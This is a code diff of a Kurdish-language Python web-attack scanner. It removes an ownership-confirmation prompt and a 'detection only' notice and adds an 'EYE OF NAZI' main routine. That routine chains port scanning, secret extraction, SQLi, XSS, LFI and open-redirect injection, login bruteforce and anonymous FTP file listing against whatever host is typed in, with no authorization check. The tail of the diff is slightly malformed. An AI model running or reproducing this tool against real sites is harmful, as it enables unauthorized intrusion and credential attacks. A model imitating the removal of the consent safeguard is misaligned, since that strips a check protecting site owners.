-            print("  \033[91m[!]\033[0m " + str(e))
-
-        try:
-            self.gather_author()
-        except Exception as e:
-            print("  \033[91m[!]\033[0m " + str(e))
-
-        try:
-            self.gather_emails()
-        except Exception as e:
-            print("  \033[91m[!]\033[0m " + str(e))
-
-        try:
-            self.gather_files()
-        except Exception as e:
-            print("  \033[91m[!]\033[0m " + str(e))
-
-        try:
-            self.gather_headers()
-        except Exception as e:
-            print("  \033[91m[!]\033[0m " + str(e))
-
-        try:
-            self.gather_cve()
-        except Exception as e:
-            print("  \033[91m[!]\033[0m " + str(e))
-
-        host = urllib.parse.urlparse(self.url).hostname
-        if host:
-            try:
-                self.gather_ports(host)
-            except Exception as e:
-                print("  \033[91m[!]\033[0m " + str(e))
-
-        # Summary
-        print("\n\033[96m" + "=" * 60 + "\033[0m")
-        print("\033[1m  SCAN COMPLETE\033[0m")
-        print("\033[96m" + "=" * 60 + "\033[0m")
-        crit = sum(1 for f in self.f if f['severity'] == 'CRITICAL')
-        high = sum(1 for f in self.f if f['severity'] == 'HIGH')
-        med = sum(1 for f in self.f if f['severity'] == 'MEDIUM')
-        info = sum(1 for f in self.f if f['severity'] == 'INFO')
-        print("  Files Checked: " + str(self.checked))
-        print("  Files Found: " + str(len(self.files_found)))
-        print("  Emails: " + str(len(self.emails)))
-        print("  Info Gathered: " + str(len(self.info)))
-        print("  Findings: \033[1m\033[91m" + str(len(self.f)) + "\033[0m")
-        print("    \033[41m\033[97m CRITICAL \033[0m " + str(crit))
-        print("    \033[43m HIGH     \033[0m " + str(high))
-        print("    \033[93m MEDIUM   \033[0m " + str(med))
-        print("    \033[2m INFO     \033[0m " + str(info))
-        print("\033[96m" + "=" * 60 + "\033[0m\n")
-
-    def save_json(self, filename):
-        with open(filename, 'w', encoding='utf-8') as fp:
-            json.dump({
-                'target': self.url,
-                'info': self.info,
-                'emails': list(self.emails),
-                'files_found': [f['url'] for f in self.files_found],
-                'findings': self.f,
-            }, fp, indent=2, ensure_ascii=False)
-        print("\033[92m[+]\033[0m Saved: " + filename)
-# ═══════════════════════════════════════════════════════════
-# VULNERABILITY SCANNERS
-# ═══════════════════════════════════════════════════════════
-
-def params(self, url):
-    q = urllib.parse.urlparse(url).query
-    if not q:
-        return []
-    return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())
-
-def inject(self, url, param, payload):
-    pr = urllib.parse.urlparse(url)
-    qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
-    qs[param] = [payload]
-    return urllib.parse.urlunparse(
-        (pr.scheme, pr.netloc, pr.path, pr.params,
-         urllib.parse.urlencode(qs, doseq=True), pr.fragment))
-
-# ─────────────── SQLi ───────────────
-def test_sqli(self, url):
-    print("\n\033[96m[+]\033[0m SQLi Detection...")
-    for p in self.params(url):
-        for pl in SQLI_PAYLOADS:
-            r = self.cl.req(self.inject(url, p, pl))
-            if r['err']:
-                continue
-            for err in SQLI_ERRORS:
-                if err in r['t'].lower():
-                    self.add(url, 'SQLI', "DB error: " + err, "CRITICAL")
-                    return
-            if 'sleep' in pl.lower() and r['dt'] > 2.5:
-                self.add(url, 'SQLI',
-                         "Time delay: " + str(round(r['dt'], 2)) + "s",
-                         "CRITICAL")
-                return
-
-# ─────────────── XSS ───────────────
-def test_xss(self, url):
-    print("\n\033[96m[+]\033[0m XSS Detection...")
-    for p in self.params(url):
-        for pl in XSS_PAYLOADS:
-            r = self.cl.req(self.inject(url, p, pl))
-            if r['err']:
-                continue
-            if pl in r['t']:
-                self.add(url, 'XSS', "Reflected: " + pl[:50], "HIGH")
-                return
-
-# ─────────────── LFI ───────────────
-def test_lfi(self, url):
-    print("\n\033[96m[+]\033[0m LFI Detection...")
-    for p in self.params(url):
-        for pl in LFI_PAYLOADS:
-            r = self.cl.req(self.inject(url, p, pl))
-            if r['err']:
-                continue
-            for ind in LFI_IND:
-                if ind in r['t']:
-                    self.add(url, 'LFI', "Leak: " + ind, "CRITICAL")
-                    return
-
-# ─────────────── RCE ───────────────
-def test_rce(self, url):
-    print("\n\033[96m[+]\033[0m RCE Detection...")
-    for p in self.params(url):
-        for pl in RCE_PAYLOADS:
-            r = self.cl.req(self.inject(url, p, pl))
-            if r['err']:
-                continue
-            for ind in RCE_IND:
-                if ind in r['t']:
-                    self.add(url, 'RCE', "Output: " + ind, "CRITICAL")
-                    return
-
-# ─────────────── HTTP METHODS ───────────────
-def test_http_methods(self, url):
-    print("\n\033[96m[+]\033[0m HTTP Methods...")
-    allowed = []
-    for m in HTTP_METHODS:
-        r = self.cl.req(url, method=m)
-        if not r['err'] and r['s'] not in (405, 501):
-            allowed.append(m)
-            if m in ('PUT', 'DELETE', 'TRACE'):
-                self.add(url, 'HTTP',
-                         "Method " + m + " allowed (" + str(r['s']) + ")",
-                         "HIGH")
-    if allowed:
-        self.info_add('HTTP-Methods', ', '.join(allowed))
-
-# ─────────────── SSL/TLS ───────────────
-def test_ssl(self, url):
-    print("\n\033[96m[+]\033[0m SSL/TLS Audit...")
-    pr = urllib.parse.urlparse(url)
-    if pr.scheme != 'https':
-        return
-    try:
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        with socket.create_connection((pr.hostname, pr.port or 443),
-                                      timeout=5) as s:
-            with ctx.wrap_socket(s, server_hostname=pr.hostname) as ss:
-                version = ss.version()
-                cipher = ss.cipher()
-                self.info_add('TLS-Version', version)
-                if cipher:
-                    self.info_add('TLS-Cipher', cipher[0])
-                cert = ss.getpeercert()
-                if cert:
-                    subject = dict(x[0] for x in cert.get('subject', []))
-                    issuer = dict(x[0] for x in cert.get('issuer', []))
-                    if subject.get('commonName'):
-                        self.info_add('SSL-CN',
-                                      subject.get('commonName'))
-                    if issuer.get('organizationName'):
-                        self.info_add('SSL-Issuer',
-                                      issuer.get('organizationName'))
-                if version in ('TLSv1', 'TLSv1.1', 'SSLv2', 'SSLv3'):
-                    self.add(url, 'SSL', "Weak: " + version, "HIGH")
-    except Exception as e:
-        print("  \033[91m[!]\033[0m " + str(e))
-
-# ─────────────── SUBDOMAIN ENUM ───────────────
-def test_subdomains(self, domain):
-    print("\n\033[96m[+]\033[0m Subdomain Enumeration...")
-    found = 0
-    with ThreadPoolExecutor(max_workers=20) as ex:
-        futures = {}
-        for s in SUBDOMAINS:
-            url = "http://" + s + "." + domain
-            futures[ex.submit(self.cl.req, url)] = (s, url)
-        for fut in as_completed(futures):
-            s, url = futures[fut]
-            try:
-                r = fut.result()
-                if not r['err'] and r['s'] in (200, 301, 302, 401, 403):
-                    self.add(url, 'SUB',
-                             "Subdomain found (" + str(r['s']) + ")",
-                             "MEDIUM")
-                    found += 1
-            except Exception:
-                pass
-    print("  \033[92m[+]\033[0m Found " + str(found) + " subdomain(s)")
-
-# ─────────────── DEEP SCAN ───────────────
-def deep_scan(self):
-    """Run vulnerability tests on URL with params"""
-    params = self.params(self.url)
-    if not params:
-        print("\n\033[93m[!]\033[0m No URL parameters to test")
-        return
-    try:
-        self.test_sqli(self.url)
-    except Exception as e:
-        print("  \033[91m[!]\033[0m " + str(e))
-    try:
-        self.test_xss(self.url)
-    except Exception as e:
-        print("  \033[91m[!]\033[0m " + str(e))
-    try:
-        self.test_lfi(self.url)
-    except Exception as e:
-        print("  \033[91m[!]\033[0m " + str(e))
-    try:
-        self.test_rce(self.url)
-    except Exception as e:
-        print("  \033[91m[!]\033[0m " + str(e))
-
-# ─────────────── FORMS DISCOVERY ───────────────
-def get_forms(self, url):
-    r = self.cl.req(url)
-    if r['err'] or not r['t']:
-        return []
-    forms = []
-    for fm in re.finditer(r'<form[^>]*>(.*?)</form>',
-                          r['t'], re.DOTALL | re.IGNORECASE):
-        html = fm.group(1)
-        am = re.search(r'action=["\']([^"\']*)["\']', html, re.IGNORECASE)
-        mm = re.search(r'method=["\']([^"\']*)["\']', html, re.IGNORECASE)
-        action = am.group(1) if am else url
-        method = (mm.group(1) if mm else 'get').lower()
-        if not action or action == '#':
-            action = url
-        elif not action.startswith(('http://', 'https://')):
-            action = urllib.parse.urljoin(url, action)
-        inputs = re.findall(
-            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
-            html, re.IGNORECASE)
-        inputs += re.findall(
-            r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
-            html, re.IGNORECASE)
-        if inputs:
-            forms.append({'action': action, 'method': method,
-                          'inputs': list(set(inputs))})
-    return forms
-
-def test_forms(self):
-    print("\n\033[96m[+]\033[0m Form Discovery...")
-    forms = self.get_forms(self.url)
-    if not forms:
-        return
-    print("  \033[92m[+]\033[0m Found " + str(len(forms)) + " form(s)")
-    for fm in forms:
-        print("\n  \033[93m[*]\033[0m Form: " + fm['action'][:70] +
-              " [" + fm['method'].upper() + "]")
-        for p in fm['inputs']:
-            print("    \033[2m->\033[0m \033[93m" + p + "\033[0m")
-            if fm['method'] == 'post':
-                fd = {i: 'test' for i in fm['inputs']}
-                d = urllib.parse.urlencode(fd).encode()
-                try:
-                    self.test_sqli_post(fm['action'], p, d)
-                    self.test_xss_post(fm['action'], p, d)
-                except Exception:
-                    pass
-            else:
-                tu = fm['action'] + '?' + urllib.parse.urlencode(
-                    {i: 'test' for i in fm['inputs']})
-                old_url = self.url
-                self.url = tu
-                try:
-                    self.test_sqli(tu)
-                    self.test_xss(tu)
-                except Exception:
-                    pass
-                self.url = old_url
-
-def test_sqli_post(self, url, param, data):
-    for pl in SQLI_PAYLOADS[:5]:
-        fd = dict(urllib.parse.parse_qsl(data.decode()))
-        fd[param] = pl
-        nd = urllib.parse.urlencode(fd).encode()
-        r = self.cl.req(url, data=nd, method='POST')
-        if r['err']:
-            continue
-        for err in SQLI_ERRORS:
-            if err in r['t'].lower():
-                self.add(url, 'SQLI', "POST " + param + ": " + err,
-                         "CRITICAL")
-                return
-
-def test_xss_post(self, url, param, data):
-    for pl in XSS_PAYLOADS:
-        fd = dict(urllib.parse.parse_qsl(data.decode()))
-        fd[param] = pl
-        nd = urllib.parse.urlencode(fd).encode()
-        r = self.cl.req(url, data=nd, method='POST')
-        if r['err']:
-            continue
-        if pl in r['t']:
-            self.add(url, 'XSS', "POST " + param + ": " + pl[:50],
-                     "HIGH")
-# ═══════════════════════════════════════════════════════════════════════════
-# AUTO-DETECT + MAIN
-# ═══════════════════════════════════════════════════════════════════════════
-
-def is_url(text):
-    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$', text):
-        return True
-    if text.startswith(('http://', 'https://')):
-        return True
-    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text):
-        return True
-    if text.startswith('localhost'):
-        return True
-    return False
-
-
-def normalize_url(text):
-    if not text.startswith(('http://', 'https://')):
-        text = 'http://' + text
-    return text
-
-
+# ═══════════════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════════════
 def main():
+    os.system("clear" if os.name == "posix" else "cls")
     print(LOGO)
-    print("\n\033[96m" + "=" * 60 + "\033[0m")
-    print("\033[92m  Information Gatherer - Type your OWN site domain.\033[0m")
-    print("\033[93m  Detection only. No exploitation.\033[0m")
-    print("\033[96m" + "=" * 60 + "\033[0m")
-    print("\n\033[93mAccepted formats:\033[0m")
-    print("  \033[92mkurd4u.com\033[0m              - Domain")
-    print("  \033[92mhttps://kurd4u.com\033[0m      - With protocol")
-    print("  \033[92mhttp://kurd4u.com/path?id=1\033[0m - Full URL with params")
-    print("  \033[92m192.168.1.1\033[0m             - IP address")
-    print("  \033[92mlocalhost\033[0m               - Localhost")
-    print("\n\033[93mOther commands:\033[0m")
-    print("  \033[92mcookie <value>\033[0m   - Set cookie")
-    print("  \033[92mproxy <URL>\033[0m      - Set proxy")
-    print("  \033[92mthreads <N>\033[0m      - Set thread count")
-    print("  \033[92msave <file>\033[0m      - Save last scan as JSON")
-    print("  \033[92mstatus\033[0m           - Show current settings")
-    print("  \033[92mclear\033[0m            - Clear screen")
-    print("  \033[92mexit\033[0m             - Quit\n")
+    print(f"\n{C.R}{'═'*60}{C.RESET}")
+    print(f"{C.BOLD}         E Y E   O F   N A Z I   v{VERSION}{C.RESET}")
+    print(f"{C.M}       Web Scanner · 20 Features · HTML Report{C.RESET}")
+    print(f"{C.R}{'═'*60}{C.RESET}\n")
 
-    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last': None}
+    target = input(f"{C.Y}ناوی وێبسایت یان IP: {C.RESET}").strip()
+    if not target:
+        print(f"{C.R}[-] هیچ نەدرا. دەرچوون.{C.RESET}")
+        return
 
-    while True:
+    base_url, host = norm_target(target)
+    LOG.log(f"ئامانج: {base_url} · host: {host}", "INFO")
+    start = time.time()
+
+    # ─── جێبەجێکردنی هەموو تایبەتمەندییەکان ───
+    print(f"\n{C.B}━━━ DNS & NETWORK ━━━{C.RESET}")
+    try: feat_dns(host)
+    except Exception as e: LOG.log(f"DNS: {e}", "ERR")
+    try: feat_whois(host)
+    except Exception as e: LOG.log(f"WHOIS: {e}", "ERR")
+    try: feat_ssl(host)
+    except Exception as e: LOG.log(f"SSL: {e}", "ERR")
+
+    print(f"\n{C.B}━━━ SUBDOMAIN ENUM ━━━{C.RESET}")
+    try: feat_subdomains(host)
+    except Exception as e: LOG.log(f"Subdomains: {e}", "ERR")
+
+    print(f"\n{C.B}━━━ PORT SCAN ━━━{C.RESET}")
+    try:
+        open_ports = feat_ports(host)
+        for p in open_ports[:10]:
+            feat_banner(host, p)
+    except Exception as e:
+        LOG.log(f"Ports: {e}", "ERR")
+        open_ports = []
+
+    print(f"\n{C.B}━━━ HTTP ANALYSIS ━━━{C.RESET}")
+    for fn in [feat_headers, feat_tech, feat_waf, feat_cors]:
+        try: fn(base_url)
+        except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")
+
+    print(f"\n{C.B}━━━ FILES & DIRECTORIES ━━━{C.RESET}")
+    for fn in [feat_files, feat_dirs]:
+        try: fn(base_url)
+        except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")
+
+    print(f"\n{C.B}━━━ EXTRACT ━━━{C.RESET}")
+    for fn in [feat_extract, feat_js, feat_secrets]:
+        try: fn(base_url)
+        except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")
+
+    print(f"\n{C.B}━━━ VULNERABILITY SCAN ━━━{C.RESET}")
+    for fn in [feat_sqli, feat_xss, feat_lfi, feat_open_redirect]:
+        try: fn(base_url)
+        except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")
+
+    print(f"\n{C.B}━━━ LOGIN BRUTEFORCE ━━━{C.RESET}")
+    try: feat_login(base_url)
+    except Exception as e: LOG.log(f"Login: {e}", "ERR")
+
+    # FTP check ئەگەر پۆرتی 21 کراوە بوو
+    if 21 in open_ports:
+        print(f"\n{C.B}━━━ FTP ━━━{C.RESET}")
         try:
-            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
-                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
-        except (EOFError, KeyboardInterrupt):
-            print("\n\033[93m[!] Bye\033[0m")
-            break
+            ftp = ftplib.FTP(host, timeout=5)
+            ftp.login("anonymous", "")
+            files = ftp.nlst()
+            LOG.log(f"[!] FTP کراوە — {len(files)} فایل", "HIT")
+            for f in files[:20]:
+                LOG.log(f"    {f}", "OK")
+            ftp.quit()
+        except Exception as e:
+            LOG.log(f"FTP: {e}", "WARN")
 
-        if not line:
-            continue
+    # ─── کۆتایی ───
+    duration = time.time() - start
+    print(f"\n{C.R}{'═'*60}{C.RESET}")
+    print(f"{C.G}[✓] تەواو بوو لە {duration:.2f} چرکە{C.RESET}")
+    print(f"{C.G}[✓] دۆزینەوەکان: {len(FINDINGS)}{C.RESET}")
 
-        parts = line.split(maxsplit=1)
-        cmd = parts[0].lower()
-        arg = parts[1].strip() if len(parts) > 1 else ""
+    counts = defaultdict(int)
+    for f in FINDINGS:
+        counts[f["severity"]] += 1
+    print(f"{C.R}    CRITICAL: {counts['CRITICAL']}{C.RESET}")
+    print(f"{C.M}    HIGH:     {counts['HIGH']}{C.RESET}")
+    print(f"{C.Y}    MEDIUM:   {counts['MEDIUM']}{C.RESET}")
+    print(f"{C.C}    LOW:      {counts['LOW']}{C.RESET}")
+    print(f"{C.R}{'═'*60}{C.RESET}")
 
-        # ─── EXIT ───
-        if cmd in ('exit', 'quit', 'q'):
-            print("\033[93mBye.\033[0m")
-            break
-
-        # ─── HELP ───
-        elif cmd == 'help':
-            print("Type a domain (e.g. kurd4u.com) or: cookie, proxy, "
-                  "threads, save, status, clear, exit")
-
-        # ─── COOKIE ───
-        elif cmd == 'cookie':
-            if arg:
-                st['cookie'] = arg
-                print("\033[92m[+] Cookie set\033[0m")
-            else:
-                print("\033[91m[!] cookie <value>\033[0m")
-
-        # ─── PROXY ───
-        elif cmd == 'proxy':
-            if arg:
-                st['proxy'] = arg
-                print("\033[92m[+] Proxy set\033[0m")
-            else:
-                print("\033[91m[!] proxy <URL>\033[0m")
-
-        # ─── THREADS ───
-        elif cmd == 'threads':
-            if arg:
-                try:
-                    st['threads'] = int(arg)
-                    print("\033[92m[+] Threads: " + arg + "\033[0m")
-                except ValueError:
-                    print("\033[91m[!] threads <number>\033[0m")
-            else:
-                print("\033[91m[!] threads <number>\033[0m")
-
-        # ─── STATUS ───
-        elif cmd == 'status':
-            print("\n\033[96mSettings:\033[0m")
-            print("  Cookie  : " + str(st['cookie'] or '(none)'))
-            print("  Proxy   : " + str(st['proxy'] or '(none)'))
-            print("  Threads : " + str(st['threads']) + "\n")
-
-        # ─── CLEAR ───
-        elif cmd == 'clear':
-            os.system('clear')
-            print(LOGO)
-
-        # ─── SAVE ───
-        elif cmd == 'save':
-            if not st['last']:
-                print("\033[91m[!] No scan yet\033[0m")
-            elif not arg:
-                print("\033[91m[!] save <filename>\033[0m")
-            else:
-                st['last'].save_json(arg)
-
-        # ─── SCAN ───
-        elif is_url(cmd):
-            url = normalize_url(cmd)
-            print("\n\033[93m[!]\033[0m Only use on YOUR OWN site!")
-            print("\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
-            conf = input("\033[93m    Confirm you own this site? "
-                         "(yes/no): \033[0m").strip().lower()
-            if conf not in ('yes', 'y', 'بەڵێ', 'b'):
-                print("\033[93m[!] Aborted.\033[0m")
-                continue
-            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
-            sc = Scan(url, cl, threads=st['threads'])
-            try:
-                sc.run_all()
-                st['last'] = sc
-            except KeyboardInterrupt:
-                print("\n\033[93m[!] Stopped\033[0m")
-                st['last'] = sc
-            except Exception as e:
-                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
-
-        # ─── UNKNOWN ───
-        else:
-            print("\033[91m[!] Unknown: " + cmd + "\033[0m")
-            print("\033[93m    Type a domain (e.g. kurd4u.com) or 'help'\033[0m")
+    # ڕاپۆرت
+    build_report(base_url, duration)
+    LOG.log(f"[✓] لۆگ: {LOGFILE}", "OK")
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("\n\033[93m[!] Bye\033[0m")
-            return
+        print(f"\n{C.R}[!] پچڕا. ڕاپۆرت دەنووسرێت...{C.RESET}")
+        if FINDINGS:
+            build_report("interrupted", 0)
+        sys.exit(0)
